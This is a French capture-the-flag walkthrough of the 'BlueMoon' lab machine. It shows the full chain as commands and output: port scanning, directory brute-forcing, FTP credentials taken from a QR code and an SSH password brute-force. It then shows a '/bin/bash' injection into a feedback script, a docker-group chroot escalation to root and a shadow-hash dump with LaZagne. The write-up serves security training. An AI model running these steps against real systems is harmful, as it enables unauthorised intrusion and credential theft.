1.Énumération

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo sh massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] Scan IP: 192.168.56.215
[i] Rate: 1000
 
[+] Scan Masscan 192.168.56.215...100%
[+] Scan Nmap 192.168.56.215...100%
 
[+] 22/tcp open
[+] 80/tcp open
[+] 21/tcp open
 
==========================================================
|                         Rapports                       |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.215-tcp.html     |
==========================================================
```

&nbsp;

<span style="color: #dddddd;">👊</span> Gobuster

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $gobuster dir -u http://192.168.56.215/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.215/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 383]
/.html                (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
/hidden_text          (Status: 200) [Size: 1169]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

&nbsp;

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $curl http://192.168.56.215/hidden_text | grep '.png'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1169  100  1169    0     0   191k      0 --:--:-- --:--:-- --:--:--  228k
    <p><a href=".QR_C0d3.png">Thank You ...</a></p>
```

&nbsp;

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $wget http://192.168.56.215/.QR_C0d3.png 
--2025-04-29 18:13:10--  http://192.168.56.215/.QR_C0d3.png
Connexion à 192.168.56.215:80… connecté.
requête HTTP transmise, en attente de la réponse… 200 OK
Taille : 2020 (2,0K) [image/png]
Sauvegarde en : « .QR_C0d3.png »

.QR_C0d3.png                                    100%[=====================================================================================================>]   1,97K  --.-KB/s    ds 0s      

2025-04-29 18:13:10 (52,1 MB/s) — « .QR_C0d3.png » sauvegardé [2020/2020]
```

&nbsp;

**<span style="color: #dddddd;">📦</span> Zbar-tools**

Extraction des info du QRcode

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $zbarimg -q --raw .QR_C0d3.png
#!/bin/bash

HOST=ip
USER=userftp
PASSWORD=ftpp@ssword

ftp -inv $HOST user $USER $PASSWORD
bye
EOF
```

&nbsp;

**<span style="color: #dddddd;">🖥️</span> Netexec**

Test des cred trouver

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $nxc ftp 192.168.56.215 -u userftp -p 'ftpp@ssword' --ls
FTP         192.168.56.215  21     192.168.56.215   [*] Banner: (vsFTPd 3.0.3)
FTP         192.168.56.215  21     192.168.56.215   [+] userftp:ftpp@ssword
FTP         192.168.56.215  21     192.168.56.215   [*] Directory Listing
FTP         192.168.56.215  21     192.168.56.215   -rw-r--r--    1 0        0             147 Mar 08  2021 information.txt
FTP         192.168.56.215  21     192.168.56.215   -rw-r--r--    1 0        0             363 Mar 08  2021 p_lists.txt

```

&nbsp;

Téléchargement des fichier `.txt`

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $nxc ftp 192.168.56.215 -u userftp -p 'ftpp@ssword' --get information.txt
FTP         192.168.56.215  21     192.168.56.215   [*] Banner: (vsFTPd 3.0.3)
FTP         192.168.56.215  21     192.168.56.215   [+] userftp:ftpp@ssword
FTP         192.168.56.215  21     192.168.56.215   [+] Downloaded: information.txt
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $nxc ftp 192.168.56.215 -u userftp -p 'ftpp@ssword' --get p_lists.txt
FTP         192.168.56.215  21     192.168.56.215   [*] Banner: (vsFTPd 3.0.3)
FTP         192.168.56.215  21     192.168.56.215   [+] userftp:ftpp@ssword
FTP         192.168.56.215  21     192.168.56.215   [+] Downloaded: p_lists.txt
```

&nbsp;

Allons voir le contenu de ses 2 fichiers

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $cat information.txt

Hello robin ...!
    
    I'm Already Told You About Your Password Weekness. I will give a Password list. you May Choose Anyone of The Password.
```

&nbsp;

Cela ressemble a une `wordlist` de mot de passe

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $cat p_lists.txt
h4ck3rp455wd
4dm1n
Pr0h4ck3r
5cr1ptk1dd3
pubgpr0pl4yer
H34d5h00t3r
p@ssw0rd
@@d1dn0tf1nd
J4ck_5p4rr0w
c4pt10n_jack
D0veC4m3r0n
f1nnb4l0r
r0manr3ing5
s3thr0lin5
Demonk1ng
R4ndy0rton
Big_sh0w
j0hnc3na
5tr0ngp@ssw0rd
S4br1n4
4nnlyn
C4rp3nt3r
K0fiKing5t0n
chNAMPIN
Herr0lins
G0palT0p3r
Log3shDriv3r
k4rv3ndh4nh4ck3r
P0nmuGunth0n
Shank3rD3v
KishorMilkV4n
S4th15hR4cer
```

&nbsp;

Brute Force du mot de passe de utilisateur `robin` trouver précédemment

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $nxc ssh 192.168.56.215 -u robin -p p_lists.txt | grep '[+]'
SSH                      192.168.56.215  22     192.168.56.215   [*] SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
SSH                      192.168.56.215  22     192.168.56.215   [+] robin:k4rv3ndh4nh4ck3r  Linux - Shell access!

```

&nbsp;

**<span style="color: #dddddd;">🔒</span> SSH**

Grace a un script , nous avons pu se connecter avec l’utilisateur `jerry`

```
robin@BlueMoon:/project$ sudo -u ./feedbask.sh

Script For FeedBack

Enter Your Name : test

Enter You FeedBack About This Target Machine : /bin/bash

id
uid=1002(jerry) gid=1002(jerry) groups=1002(jerry),114(docker)
python -c 'import pty;pty.spawn("/bin/bash")'
jerry@BlueMoon:/home/robin/project$ 
```

&nbsp;

**<span style="color: #dddddd;">⚙️</span> GTFobin**

**https://gtfobins.github.io/gtfobins/docker/**

```
jerry@BlueMoon:~$ id
uid=1002(jerry) gid=1002(jerry) groups=1002(jerry),114(docker)
```

&nbsp;

**<span style="color: #dddddd;">💀</span> Docker**

Élévation de privilège avec docker

```
jerry@BlueMoon:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# bash -i
root@1c9751abed30:/home# 
```

&nbsp;

**<span style="color: #dddddd;">👾</span> LaZagne**

Cherchons les mot de passe sur la machine

```
root@1c9751abed30:/tmp/LaZagne-2.4.6/Linux# python3 laZagne.py all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: robin
Hash: $6$rmps5iDqdWg9pyqo$S/No/njzog/zfSgunw/uOmW0k6cUO/lKJdWRGwVZsPSmPJapAZOwtSknZtIJbNhlFXksaKXEn8nFsPFMSPhSS/:18694:0:99999:7:::

[+] Hash found !!!
Login: root
Hash: $6$kOzZwhK2XxOtpD9h$vpt93qjntiOw/wU2GR2k4k5va40Q/d1W3L2REy1DBkDzJLlJiwAwTUs4kHjQojJVB0EL4rT4bEkbK5bIDdhnr0:18694:0:99999:7:::

[+] Hash found !!!
Login: jerry
Hash: $6$d6/WCmiHWPA2xnJr$09daY0nREuN1vu5sRVUplPrIN8mA72aTEfEYsme.R3U7n8ylimOm0VTs/j2ZkS1yuyXRSWMeJuUahPcMKc0QI/:18694:0:99999:7:::

[+] Hash found !!!
Login: userftp
Hash: $6$AxUkNB5bY14nCK27$cFjSD27Weu3CPiCv3hsL3HhXb1CWOd0kHWuip1q3AqYjaP7VPdaWdlwUgVhufl4QJeZxvi3ihBOIoP50IEePd/:18694:0:99999:7:::


[+] 4 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.03434634208679199

```

&nbsp;

Identifiant trouver

| Users | Passwords |
| --- | --- |
| robin | k4rv3ndh4nh4ck3r |
| userftp | ftpp@ssword |